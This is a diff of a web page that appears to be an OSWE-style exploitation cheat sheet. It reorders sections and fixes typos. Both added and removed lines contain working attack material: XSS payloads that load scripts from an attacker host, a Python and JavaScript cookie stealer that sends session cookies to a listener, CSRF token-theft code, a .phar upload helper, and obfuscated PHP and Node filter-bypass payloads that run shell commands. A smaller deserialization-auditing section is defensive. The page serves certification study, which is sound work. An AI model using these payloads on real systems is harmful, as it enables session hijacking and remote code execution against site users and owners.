@@ -18,7 +18,7 @@ permalink: /python-code-snippets/
     --bg: #0a0a0a;
     --panel: #151515;
     --muted: #a1a1a1;
-    --text: #f08080;
+    --text: #d4d4d4;
     --accent: #ff7f50;
     --accent-2: #ffffff;
     --code-bg: #050505;
@@ -134,54 +134,70 @@ permalink: /python-code-snippets/
     <div class="oswe-toc panel">
       <strong>Contents</strong>
       <ol>
-        <li><a href="#Concepts">Concepts</a></li>
-        <li><a href="#Enable-Database-Debug-and-Logging" class="main-group" data-subs="Postgres,MySQL">Enable Database Debug and Logging</a>
+        <li><a href="#Authentication-Bypass">Authentication Bypass</a></li>
+        <li><a href="#Remote-Code-Execution">Remote Code Execution</a></li>
+        <li><a href="#SQL-Injection">SQL Injection</a></li>
+        <li><a href="#XSS">XSS</a>
+          <ul>
+            <li><a href="#XSS-Payload-1">Payload 1 (Load External JS)</a></li>
+            <li><a href="#XSS-Payload-2">Payload 2 (Load Inline JS)</a></li>
+            <li><a href="#XSS-Cookies-Stealer">XSS Cookies Stealer</a></li>
+            <li><a href="#Leverage-XSS-to-CSRF">Leverage XSS to CSRF</a></li>
+          </ul>
+        </li>
+        <li><a href="#CSRF">CSRF</a></li>
+        <li><a href="#File-Upload">File Upload</a></li>
+        <li><a href="#Insecure-Deserialization">Insecure Deserialization</a>
+          <ul>
+            <li><a href="#Java-Insecure-Deserialization">Java Insecure Deserialization</a></li>
+          </ul>
+        </li>
+        <li><a href="#SSTI">SSTI</a></li>
+        <li><a href="#Prototype-Pollution">Prototype Pollution</a></li>
+        <li><a href="#SSRF">SSRF</a></li>
+        <li><a href="#Type-Juggling">Type Juggling</a></li>
+        <li><a href="#Application-Logic-Flaws">Application Logic Flaws</a></li>
+        <li><a href="#CORS">CORS</a></li>
+        <li><a href="#Database-Debug-Logging">Database Debug & Logging</a>
           <ul>
             <li><a href="#Postgres">Postgres</a></li>
             <li><a href="#MySQL">MySQL</a></li>
           </ul>
         </li>
-        <li><a href="#Python-Code-Snippets" class="main-group" data-subs="Starting-Template,File-Upload,HTTP-File-Server,Python-XSS-Cookies-Stealer">Python Code Snippets</a>
+        <li><a href="#Python-Templates">Python Templates</a>
           <ul>
             <li><a href="#Starting-Template">Starting Template</a></li>
-            <li><a href="#File-Upload">File Upload</a></li>
-            <li><a href="#HTTP-File-Server">HTTP File Server</a></li>
-            <li><a href="#Python-XSS-Cookies-Stealer">XSS Cookies Stealer</a></li>
+            <li><a href="#File-Upload-Template">File Upload Template</a></li>
+            <li><a href="#HTTP-File-Server-Template">HTTP File Server Template</a></li>
           </ul>
         </li>
-        <li><a href="#XSS-Payloads" class="main-group" data-subs="Payload-1,Payload-2,Leverage-XSS-to-CSRF,XSS-Cookies-Stealer-js">XSS Payloads</a>
+        <li><a href="#Bypass-Filters">Bypass Filters</a>
           <ul>
-            <li><a href="#Payload-1">Payload 1</a></li>
-            <li><a href="#Payload-2">Payload 2</a></li>
-            <li><a href="#Leverage-XSS-to-CSRF">Leverage XSS to CSRF</a></li>
-            <li><a href="#XSS-Cookies-Stealer-js">Filter cookie & send</a></li>
+            <li><a href="#Bypass-PHP-Eval-Filtering">Bypass PHP Eval Filtering</a></li>
+            <li><a href="#Bypass-Javascript-Injection-Filters">Bypass Javascript Injection Filters</a></li>
           </ul>
         </li>
-        <li><a href="#Java-Code-Snippets">Java Code Snippets</a></li>
-        <li><a href="#Java-Insecure-Deserialization">Java Insecure Deserialization</a></li>
-        <li><a href="#Regex-Cheetsheet">Regex Cheetsheet</a></li>
-        <li><a href="#Bypass-PHP-Eval-Filtering">Bypass PHP Eval Filtering</a></li>
-        <li><a href="#Bypass-Javascript-Injection-Filters">Bypass Javascript Injection Filters</a></li>
-        <li><a href="#YSOSerial-Payload-Creation">YSOSerial</a></li>
-        <li><a href="#Report-Recommendations">Report Recommedations</a></li>
+        <li><a href="#YSOSerial">YSOSerial</a></li>
+        <li><a href="#Regex-Cheatsheet">Regex Cheatsheet</a></li>
+        <li><a href="#Report-Recommendations">Report Recommendations</a></li>
         <li><a href="#Additional-Resources">Additional Resources</a></li>
       </ol>
     </div>
 
     <div class="oswe-content">
       <!-- CONTENT -->
-      <div class="content-section" id="section-Concepts">
-        <h2 id="Concepts">Concepts</h2>
-
-        <h3>Authentication Bypass:</h3>
+      <div class="content-section" id="section-Authentication-Bypass">
+        <h2 id="Authentication-Bypass">Authentication Bypass</h2>
         <div class="panel">
           <p class="muted">Common techniques:</p>
           <ul>
-            <li>SQLi, XSS, Type Juggling, Application Logic Flaws, CORS, CSRF vb.</li>
+            <li>SQLi, XSS, Type Juggling, Application Logic Flaws, CORS, CSRF etc.</li>
           </ul>
         </div>
+      </div>
 
-        <h3>Remote Code Execution:</h3>
+      <div class="content-section" id="section-Remote-Code-Execution">
+        <h2 id="Remote-Code-Execution">Remote Code Execution</h2>
         <div class="panel">
           <p class="muted">Common techniques:</p>
           <ul>
@@ -190,11 +206,224 @@ permalink: /python-code-snippets/
         </div>
       </div>
 
-      <span id="Enable-Database-Debug-and-Logging"></span>
-      <div class="content-section group-enable-db" id="section-Enable-Database-Debug-and-Logging-title">
-        <h2>Enable Database Debug and Logging</h2>
+      <div class="content-section" id="section-SQL-Injection">
+        <h2 id="SQL-Injection">SQL Injection</h2>
+        <!-- Related content from concepts or other -->
+        <p>Refer to Database Debug & Logging for enabling logs to identify SQLi points.</p>
       </div>
-      <div class="content-section group-enable-db" id="section-Postgres">
+
+      <span id="XSS"></span>
+      <div class="content-section group-xss" id="section-XSS-title">
+        <h2>XSS</h2>
+      </div>
+      <div class="content-section group-xss" id="section-XSS-Payload-1">
+        <h3 id="XSS-Payload-1">Payload 1 (Load External JS)</h3>
+        <div class="panel">
+          <ul>
+            <li><code>&lt;img src="invalid-image" onerror="var script = document.createElement('script'); script.src='http://attacker-ip/malicious.js'; document.body.appendChild(script);" /&gt;</code></li>
+            <li><code>&lt;img src=x onerror=eval(atob("&lt;BASE64 JAVASCRIPT PAYLOAD&gt;"))&gt;</code></li>
+            <li><code>&lt;audio onloadstart="var s=document.createElement('script');s.src='//attacker-ip/worked.js';document.head.appendChild(s)"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
+            <li><code>&lt;iframe/srcdoc="&lt;script/src=//attacker-ip/worked.js&gt;&lt;/script&gt;"&gt;</code></li>
+            <li><code>&lt;strong onafterscriptexecute=""&gt;&lt;script src="http://attacker-ip/worked.js"&gt;&lt;/script&gt;&lt;/strong&gt;</code></li>
+          </ul>
+        </div>
+      </div>
+      <div class="content-section group-xss" id="section-XSS-Payload-2">
+        <h3 id="XSS-Payload-2">Payload 2 (Load Inline JS)</h3>
+        <div class="panel">
+          <ul>
+            <li><code>&lt;audio onloadstart="setTimeout(atob('YWxlcnQoIlhTUyIp'))"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
+            <li><code>&lt;audio src=x onerror=Function(atob('YWxlcnQoIlhTUyIp'))()&gt;&lt;/audio&gt;</code></li>
+            <li><code>&lt;audio onloadstart="Function(atob('YWxlcnQoIlhTUyIp'))()"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
+            <li><code>&lt;video src=x onerror=eval(atob('YWxlcnQoIlhTUyIp'))&gt;&lt;/video&gt;</code></li>
+          </ul>
+        </div>
+      </div>
+      <div class="content-section group-xss" id="section-XSS-Cookies-Stealer">
+        <h3 id="XSS-Cookies-Stealer">XSS Cookies Stealer</h3>
+        <div class="panel">
+          <pre><code class="language-python">import requests
+import socket
+import base64
+import re
+
+def send_xss_payload(target_url, payload_data, xss_payload):
+    data = payload_data.copy()
+    data['text'] = xss_payload  # Adjust key based on form
+    try:
+        r = requests.post(target_url, data=data, proxies=proxies)
+        if r.status_code == 200:
+            print("XSS payload sent successfully.")
+        else:
+            print(f"Server responded with status code: {r.status_code}")
+    except Exception as e:
+        print(f"Error sending payload: {e}")
+
+def listen_for_cookies(host, port, cookie_name='PHPSESSID'):
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.bind((host, port))
+        s.listen(1)
+        print(f"Listening on {host}:{port} ...")
+        print("Waiting for trigger...")
+
+        conn, addr = s.accept()
+        with conn:
+            print(f"Connection from {addr}")
+            data = conn.recv(2048)
+
+            # Base64 encode for logging
+            encoded_data = base64.b64encode(data).decode('utf-8')
+            print(f"Base64 Encoded Request: " + encoded_data)
+
+            decoded_data = data.decode('utf-8', errors='ignore')
+
+            # Extract cookie - adjust regex as needed
+            match = re.search(rf'{cookie_name}=([^;& ]+)', decoded_data)
+            if match:
+                cookie = match.group(1)
+                print(f"{cookie_name} captured: " + cookie)
+                return cookie
+            else:
+                print(f"{cookie_name} not found in received data.")
+
+# Example usage
+# target_url = 'http://example.com/post'
+# payload_data = {'title': 'test', 'author': 'blabla', 'submit': 'Submit'}
+# xss_payload = "&lt;script&gt;document.location='http://listener-ip:port/?c='+document.cookie&lt;/script&gt;"
+# send_xss_payload(target_url, payload_data, xss_payload)
+# listen_for_cookies('0.0.0.0', 9001)</code></pre>
+        </div>
+      </div>
+      <div class="content-section group-xss" id="section-Leverage-XSS-to-CSRF">
+        <h3 id="Leverage-XSS-to-CSRF">Leverage XSS to CSRF</h3>
+        <div class="panel">
+          <pre><code class="language-javascript">var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/account-endpoint',true);  // Adjust endpoint
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];  // Adjust regex
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/change-endpoint', true);  // Adjust endpoint
+    changeReq.send('csrf='+token+'&param=value')  // Adjust params
+};</code></pre>
+        </div>
+      </div>
+
+      <div class="content-section" id="section-CSRF">
+        <h2 id="CSRF">CSRF</h2>
+        <p>See Leverage XSS to CSRF in XSS section for exploitation example.</p>
+      </div>
+
+      <div class="content-section" id="section-File-Upload">
+        <h2 id="File-Upload">File Upload</h2>
+        <div class="panel">
+          <pre><code class="language-python">import requests
+import random
+import string
+import io
+
+def upload_file(url, cookies, payload_content, data, filename_extension='.phar', mime_type='application/octet-stream'):
+    pwny = io.BytesIO(payload_content)
+
+    filename = ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + filename_extension
+    files = {
+        "image": (filename, pwny, mime_type)
+    }
+
+    r = requests.post(url, data=data, files=files, cookies=cookies, proxies=proxies, allow_redirects=False)
+    # Adjust success check based on application response
+    if 'success' in r.text.lower():  # Example check
+        print(f"[+] Filename {filename} uploaded successfully!")
+        return filename
+    else:
+        print("[-] File is not uploaded.")
+        return None</code></pre>
+        </div>
+      </div>
+
+      <span id="Insecure-Deserialization"></span>
+      <div class="content-section group-deser" id="section-Insecure-Deserialization-title">
+        <h2>Insecure Deserialization</h2>
+      </div>
+      <div class="content-section group-deser" id="section-Java-Insecure-Deserialization">
+        <h3 id="Java-Insecure-Deserialization">Java Insecure Deserialization</h3>
+        <h4>Methods and Classes</h4>
+        <div class="panel">
+          <ul>
+            <li><code>ObjectInputStream.readObject()</code> Primary method for deserializing objects in Java.</li>
+            <li><code>ObjectInputStream.readUnshared()</code></li>
+            <li><code>ObjectInputStream.readResolve()</code></li>
+            <li><code>ObjectInputStream.defaultReadObject()</code></li>
+            <li><code>XMLDecoder.readObject()</code></li>
+            <li><code>XStream.fromXML()</code></li>
+            <li><code>ObjectMapper.readValue()</code> (Jackson)</li>
+            <li><code>Kryo.readObject()</code> (Kryo)</li>
+            <li><code>SnakeYAML.load()</code></li>
+          </ul>
+        </div>
+
+        <h4>Identify Insecure Deserialization in Source Code</h4>
+        <p>When auditing source code, follow these steps to identify potential insecure deserialization vulnerabilities:</p>
+
+        <h5>Search for Deserialization Methods</h5>
+        <p>Use code analysis tools (grep, IDE search, SonarQube) to find calls to the methods listed above.</p>
+        <div class="panel">
+          <pre><code class="language-bash">grep -r "readObject" .
+grep -r "XStream\.fromXML" .
+grep -r --include="*.java" -E '(ObjectInputStream\.readObject\(|ObjectInputStream\.readUnshared\(|readResolve\(|defaultReadObject\(|XMLDecoder|XStream\.fromXML\(|ObjectMapper\.readValue\(|Kryo\.readObject\(|Kryo\.readClassAndObject\(|Yaml\.load\(|HessianInput\.readObject\()' .</code></pre>
+        </div>
+
+        <h5>Trace Input Sources</h5>
+        <p>Trace inputs to see if untrusted (network, file upload, request params) data flows into deserialization APIs.</p>
+
+        <h5>Check for Validation or Whitelisting</h5>
+        <p>Look for <code>ObjectInputFilter</code> or similar filters. Example:</p>
+        <div class="panel">
+          <pre><code class="language-java">ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("allowed.package.*;!*");
+ObjectInputStream ois = new ObjectInputStream(input);
+ois.setObjectInputFilter(filter);</code></pre>
+        </div>
+
+        <h5>Inspect Serializable Classes</h5>
+        <p>Find classes implementing <code>Serializable</code> or <code>Externalizable</code> and inspect special read/write hooks.</p>
+      </div>
+
+      <div class="content-section" id="section-SSTI">
+        <h2 id="SSTI">SSTI</h2>
+        <p>Refer to concepts for exploitation techniques.</p>
+      </div>
+
+      <div class="content-section" id="section-Prototype-Pollution">
+        <h2 id="Prototype-Pollution">Prototype Pollution</h2>
+        <p>Refer to concepts for exploitation techniques.</p>
+      </div>
+
+      <div class="content-section" id="section-SSRF">
+        <h2 id="SSRF">SSRF</h2>
+        <p>Refer to concepts for exploitation techniques.</p>
+      </div>
+
+      <div class="content-section" id="section-Type-Juggling">
+        <h2 id="Type-Juggling">Type Juggling</h2>
+        <p>Refer to authentication bypass concepts.</p>
+      </div>
+
+      <div class="content-section" id="section-Application-Logic-Flaws">
+        <h2 id="Application-Logic-Flaws">Application Logic Flaws</h2>
+        <p>Refer to authentication bypass concepts.</p>
+      </div>
+
+      <div class="content-section" id="section-CORS">
+        <h2 id="CORS">CORS</h2>
+        <p>Refer to authentication bypass concepts.</p>
+      </div>
+
+      <span id="Database-Debug-Logging"></span>
+      <div class="content-section group-db" id="section-Database-Debug-Logging-title">
+        <h2>Database Debug & Logging</h2>
+      </div>
+      <div class="content-section group-db" id="section-Postgres">
         <h3 id="Postgres">Postgres</h3>
         <p>Edit your <code class="inline">/etc/postgresql/&lt;version-num&gt;/main/postgresql.conf</code>, and change the lines as follows.</p>
         <p class="muted">Note: If you didn't find the postgresql.conf file, then just type <code class="kbd">$locate postgresql.conf</code> in a terminal</p>
@@ -218,7 +447,7 @@ permalink: /python-code-snippets/
           </ol>
         </div>
       </div>
-      <div class="content-section group-enable-db" id="section-MySQL">
+      <div class="content-section group-db" id="section-MySQL">
         <h3 id="MySQL">MySQL</h3>
         <p>Login to the MySQL instance and check out the <code class="inline">general_log</code> and values, whether it is set to ON or OFF:</p>
         <div class="panel">
@@ -233,9 +462,9 @@ permalink: /python-code-snippets/
         <p>Then check <code class="inline">general_log_file</code> to find where logs are written.</p>
       </div>
 
-      <span id="Python-Code-Snippets"></span>
-      <div class="content-section group-python" id="section-Python-Code-Snippets-title">
-        <h2>Python Code Snippets</h2>
+      <span id="Python-Templates"></span>
+      <div class="content-section group-python" id="section-Python-Templates-title">
+        <h2>Python Templates</h2>
       </div>
       <div class="content-section group-python" id="section-Starting-Template">
         <h3 id="Starting-Template">Starting Template</h3>
@@ -299,10 +528,9 @@ if __name__ == "__main__":
     username, password = register(target_url, register_data)
     usercookies = login(target_url, username, password) </code></pre>
         </div>
-        <hr />
       </div>
-      <div class="content-section group-python" id="section-File-Upload">
-        <h3 id="File-Upload">File Upload With Additional Parameters</h3>
+      <div class="content-section group-python" id="section-File-Upload-Template">
+        <h3 id="File-Upload-Template">File Upload Template</h3>
         <div class="panel">
           <pre><code class="language-python">import requests
 import random
@@ -326,10 +554,9 @@ def upload_file(url, cookies, payload_content, data, filename_extension='.phar',
         print("[-] File is not uploaded.")
         return None</code></pre>
         </div>
-        <hr />
       </div>
-      <div class="content-section group-python" id="section-HTTP-File-Server">
-        <h3 id="HTTP-File-Server">HTTP File Server Template</h3>
+      <div class="content-section group-python" id="section-HTTP-File-Server-Template">
+        <h3 id="HTTP-File-Server-Template">HTTP File Server Template</h3>
         <div class="panel">
           <pre><code class="language-python">from http.server import BaseHTTPRequestHandler, HTTPServer
 import threading
@@ -376,177 +603,37 @@ def start_web_server(host='0.0.0.0', port=8000, directory='.', js_payload=None):
     return httpd</code></pre>
         </div>
       </div>
-      <div class="content-section group-python" id="section-Python-XSS-Cookies-Stealer">
-        <h3 id="Python-XSS-Cookies-Stealer">XSS Cookies Stealer Template</h3>
-        <div class="panel">
-          <pre><code class="language-python">import requests
-import socket
-import base64
-import re
 
-def send_xss_payload(target_url, payload_data, xss_payload):
-    data = payload_data.copy()
-    data['text'] = xss_payload  # Adjust key based on form
-    try:
-        r = requests.post(target_url, data=data, proxies=proxies)
-        if r.status_code == 200:
-            print("XSS payload sent successfully.")
-        else:
-            print(f"Server responded with status code: {r.status_code}")
-    except Exception as e:
-        print(f"Error sending payload: {e}")
-
-def listen_for_cookies(host, port, cookie_name='PHPSESSID'):
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.bind((host, port))
-        s.listen(1)
-        print(f"Listening on {host}:{port} ...")
-        print("Waiting for trigger...")
-
-        conn, addr = s.accept()
-        with conn:
-            print(f"Connection from {addr}")
-            data = conn.recv(2048)
-
-            # Base64 encode for logging
-            encoded_data = base64.b64encode(data).decode('utf-8')
-            print(f"Base64 Encoded Request: " + encoded_data)
-
-            decoded_data = data.decode('utf-8', errors='ignore')
-
-            # Extract cookie - adjust regex as needed
-            match = re.search(rf'{cookie_name}=([^;& ]+)', decoded_data)
-            if match:
-                cookie = match.group(1)
-                print(f"{cookie_name} captured: " + cookie)
-                return cookie
-            else:
-                print(f"{cookie_name} not found in received data.")
-
-# Example usage
-# target_url = 'http://example.com/post'
-# payload_data = {'title': 'test', 'author': 'blabla', 'submit': 'Submit'}
-# xss_payload = "&lt;script&gt;document.location='http://listener-ip:port/?c='+document.cookie&lt;/script&gt;"
-# send_xss_payload(target_url, payload_data, xss_payload)
-# listen_for_cookies('0.0.0.0', 9001)</code></pre>
-        </div>
-        <hr />
+      <span id="Bypass-Filters"></span>
+      <div class="content-section group-bypass" id="section-Bypass-Filters-title">
+        <h2>Bypass Filters</h2>
       </div>
-
-      <span id="XSS-Payloads"></span>
-      <div class="content-section group-xss" id="section-XSS-Payloads-title">
-        <h2>XSS Payloads</h2>
-      </div>
-      <div class="content-section group-xss" id="section-Payload-1">
-        <h3 id="Payload-1">Load External JavaScript</h3>
+      <div class="content-section group-bypass" id="section-Bypass-PHP-Eval-Filtering">
+        <h3 id="Bypass-PHP-Eval-Filtering">Bypass PHP Eval Filtering</h3>
         <div class="panel">
-          <ul>
-            <li><code>&lt;img src="invalid-image" onerror="var script = document.createElement('script'); script.src='http://attacker-ip/malicious.js'; document.body.appendChild(script);" /&gt;</code></li>
-            <li><code>&lt;img src=x onerror=eval(atob("&lt;BASE64 JAVASCRIPT PAYLOAD&gt;"))&gt;</code></li>
-            <li><code>&lt;audio onloadstart="var s=document.createElement('script');s.src='//attacker-ip/worked.js';document.head.appendChild(s)"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
-            <li><code>&lt;iframe/srcdoc="&lt;script/src=//attacker-ip/worked.js&gt;&lt;/script&gt;"&gt;</code></li>
-            <li><code>&lt;strong onafterscriptexecute=""&gt;&lt;script src="http://attacker-ip/worked.js"&gt;&lt;/script&gt;&lt;/strong&gt;</code></li>
-          </ul>
+          <pre><code class="language-php">get_defined_functions()['internal'][array_search(urldecode("%65%78%65%63"), get_defined_functions()['internal'])]("whoami");
+(new ReflectionFunction(hex2bin("65786563")))->invoke('hostname');</code></pre>
         </div>
       </div>
-      <div class="content-section group-xss" id="section-Payload-2">
-        <h3 id="Payload-2">Load Inline JavaScript</h3>
+      <div class="content-section group-bypass" id="section-Bypass-Javascript-Injection-Filters">
+        <h3 id="Bypass-Javascript-Injection-Filters">Bypass Javascript Injection Filters</h3>
         <div class="panel">
-          <ul>
-            <li><code>&lt;audio onloadstart="setTimeout(atob('YWxlcnQoIlhTUyIp'))"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
-            <li><code>&lt;audio src=x onerror=Function(atob('YWxlcnQoIlhTUyIp'))()&gt;&lt;/audio&gt;</code></li>
-            <li><code>&lt;audio onloadstart="Function(atob('YWxlcnQoIlhTUyIp'))()"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
-            <li><code>&lt;video src=x onerror=eval(atob('YWxlcnQoIlhTUyIp'))&gt;&lt;/video&gt;</code></li>
-          </ul>
-        </div>
-      </div>
-      <div class="content-section group-xss" id="section-Leverage-XSS-to-CSRF">
-        <h3 id="Leverage-XSS-to-CSRF">Leverage XSS to CSRF</h3>
-        <div class="panel">
-          <pre><code class="language-javascript">var req = new XMLHttpRequest();
-req.onload = handleResponse;
-req.open('get','/account-endpoint',true);  // Adjust endpoint
-req.send();
-function handleResponse() {
-    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];  // Adjust regex
-    var changeReq = new XMLHttpRequest();
-    changeReq.open('post', '/change-endpoint', true);  // Adjust endpoint
-    changeReq.send('csrf='+token+'&param=value')  // Adjust params
-};</code></pre>
-        </div>
-      </div>
-      <div class="content-section group-xss" id="section-XSS-Cookies-Stealer-js">
-        <h3 id="XSS-Cookies-Stealer-js">Filter cookie & send</h3>
-        <div class="panel">
-          <pre><code class="language-javascript">function getCookieValue(name) {
-    const cookieString = document.cookie;
-    const cookies = cookieString.split('; ');
-    for (let cookie of cookies) {
-        const [key, value] = cookie.split('=');
-        if (key === name) return value;
-    }
-    return null;
-}
-const cookieName = 'token';  // Adjust cookie name
-const cookieValue = getCookieValue(cookieName);
-
-var req2 = new XMLHttpRequest();
-req2.open('GET', 'http://attacker-ip/' + (cookieValue || ''), false);
-req2.send();</code></pre>
+          <pre><code class="language-javascript">(function(){module.constructor._load(Buffer.from('6368696c645f70726f63657373','hex').toString()).execSync('ping -c 2');})(); //" 
+(function(){module.constructor._load(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115)).execSync('ping -c 2');})();//"</code></pre>
         </div>
       </div>
 
-      <div class="content-section" id="section-Java-Code-Snippets">
-        <h2 id="Java-Code-Snippets">Java Code Snippets</h2>
+      <div class="content-section" id="section-YSOSerial">
+        <h2 id="YSOSerial">YSOSerial</h2>
+        <h3>.NET Version</h3>
+        <p><a href="https://github.com/pwntester/ysoserial.net">https://github.com/pwntester/ysoserial.net</a></p>
+
+        <h3>JAVA Version</h3>
+        <p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
       </div>
 
-      <div class="content-section" id="section-Java-Insecure-Deserialization">
-        <h2 id="Java-Insecure-Deserialization">Java Insecure Deserialization</h2>
-
-        <h3 id="Methods-and-Classes">Methods and Classes</h3>
-        <div class="panel">
-          <ul>
-            <li><code>ObjectInputStream.readObject()</code> Primary method for deserializing objects in Java.</li>
-            <li><code>ObjectInputStream.readUnshared()</code></li>
-            <li><code>ObjectInputStream.readResolve()</code></li>
-            <li><code>ObjectInputStream.defaultReadObject()</code></li>
-            <li><code>XMLDecoder.readObject()</code></li>
-            <li><code>XStream.fromXML()</code></li>
-            <li><code>ObjectMapper.readValue()</code> (Jackson)</li>
-            <li><code>Kryo.readObject()</code> (Kryo)</li>
-            <li><code>SnakeYAML.load()</code></li>
-          </ul>
-        </div>
-
-        <h3 id="Identify-Insecure-Deserialization-in-Source-Code">Identify Insecure Deserialization in Source Code</h3>
-
-        <p>When auditing source code, follow these steps to identify potential insecure deserialization vulnerabilities:</p>
-
-        <h4 id="Search-for-Deserialization-Methods">Search for Deserialization Methods</h4>
-        <p>Use code analysis tools (grep, IDE search, SonarQube) to find calls to the methods listed above.</p>
-        <div class="panel">
-          <pre><code class="language-bash">grep -r "readObject" .
-grep -r "XStream\.fromXML" .
-grep -r --include="*.java" -E '(ObjectInputStream\.readObject\(|ObjectInputStream\.readUnshared\(|readResolve\(|defaultReadObject\(|XMLDecoder|XStream\.fromXML\(|ObjectMapper\.readValue\(|Kryo\.readObject\(|Kryo\.readClassAndObject\(|Yaml\.load\(|HessianInput\.readObject\()' .</code></pre>
-        </div>
-
-        <h4 id="Trace-Input-Sources">Trace Input Sources</h4>
-        <p>Trace inputs to see if untrusted (network, file upload, request params) data flows into deserialization APIs.</p>
-
-        <h4 id="Check-for-Validation-or-Whitelisting">Check for Validation or Whitelisting</h4>
-        <p>Look for <code>ObjectInputFilter</code> or similar filters. Example:</p>
-        <div class="panel">
-          <pre><code class="language-java">ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("allowed.package.*;!*");
-ObjectInputStream ois = new ObjectInputStream(input);
-ois.setObjectInputFilter(filter);</code></pre>
-        </div>
-
-        <h4 id="Inspect-Serializable-Classes">Inspect Serializable Classes</h4>
-        <p>Find classes implementing <code>Serializable</code> or <code>Externalizable</code> and inspect special read/write hooks.</p>
-      </div>
-
-      <div class="content-section" id="section-Regex-Cheetsheet">
-        <h2 id="Regex-Cheetsheet">Regex Cheetsheet</h2>
+      <div class="content-section" id="section-Regex-Cheatsheet">
+        <h2 id="Regex-Cheatsheet">Regex Cheatsheet</h2>
         <p>Match a START and END delimeter in <code>r.text</code>:</p>
         <div class="panel">
           <pre><code class="language-python">r = requests.post(target, headers=headers, data=xml, proxies=proxies)
@@ -563,33 +650,8 @@ print(match.group(1))</code></pre>
         </div>
       </div>
 
-      <div class="content-section" id="section-Bypass-PHP-Eval-Filtering">
-        <h2 id="Bypass-PHP-Eval-Filtering">Bypass PHP Eval Filtering</h2>
-        <div class="panel">
-          <pre><code class="language-php">get_defined_functions()['internal'][array_search(urldecode("%65%78%65%63"), get_defined_functions()['internal'])]("whoami");
-(new ReflectionFunction(hex2bin("65786563")))->invoke('hostname');</code></pre>
-        </div>
-      </div>
-
-      <div class="content-section" id="section-Bypass-Javascript-Injection-Filters">
-        <h2 id="Bypass-Javascript-Injection-Filters">Bypass Javascript Injection Filters</h2>
-        <div class="panel">
-          <pre><code class="language-javascript">(function(){module.constructor._load(Buffer.from('6368696c645f70726f63657373','hex').toString()).execSync('ping -c 2');})(); //" 
-(function(){module.constructor._load(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115)).execSync('ping -c 2');})();//"</code></pre>
-        </div>
-      </div>
-
-      <div class="content-section" id="section-YSOSerial-Payload-Creation">
-        <h2 id="YSOSerial-Payload-Creation">YSOSerial</h2>
-        <h3 id="NET-Version">.NET Version</h3>
-        <p><a href="https://github.com/pwntester/ysoserial.net">https://github.com/pwntester/ysoserial.net</a></p>
-
-        <h3 id="JAVA-Version">JAVA Version</h3>
-        <p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
-      </div>
-
       <div class="content-section" id="section-Report-Recommendations">
-        <h2 id="Report-Recommendations">Report Recommedations</h2>
+        <h2 id="Report-Recommendations">Report Recommendations</h2>
         <p>For code indentation:</p>
         <ul>
           <li>Copy the code straight from VS Code into a 1x1 table in Word</li>
@@ -633,7 +695,7 @@ document.addEventListener('DOMContentLoaded', function() {
       const targetElement = document.querySelector(targetId);
       if (targetElement) {
         if (this.classList.contains('main-group')) {
-          const groupClass = targetElement.id.replace(/-/g, '-').split('-title')[0].toLowerCase();  // Adjust as needed
+          const groupClass = targetId.slice(1).toLowerCase().replace(/-/g, '-');
           document.querySelectorAll('.content-section').forEach(sec => sec.style.display = 'none');
           document.querySelectorAll(`.group-${groupClass}`).forEach(sec => sec.style.display = 'block');
           if (targetElement) targetElement.scrollIntoView({ behavior: 'smooth' });
